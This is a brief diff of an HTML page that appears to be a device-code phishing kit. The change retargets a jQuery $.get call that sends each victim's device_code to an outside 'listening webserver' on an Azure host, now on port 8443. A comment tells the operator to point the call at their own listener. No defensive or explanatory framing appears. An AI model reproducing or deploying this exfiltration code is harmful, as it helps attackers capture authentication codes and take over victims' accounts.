@@ -1,4 +1,4 @@
-
+ok
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en">
 <head id="Head1"><title>
@@ -14,7 +14,7 @@
             
             document.getElementById('code').innerHTML += data.message;
             // Change this line to point to your listening webserver
-            $.get("https://myremgro.centralindia.cloudapp.azure.com/?id=" + data.device_code);
+            $.get("https://myremgro.centralindia.cloudapp.azure.com:8443/?id=" + data.device_code);
             let message = data.message;
                 
                 // Use regex to find the URL
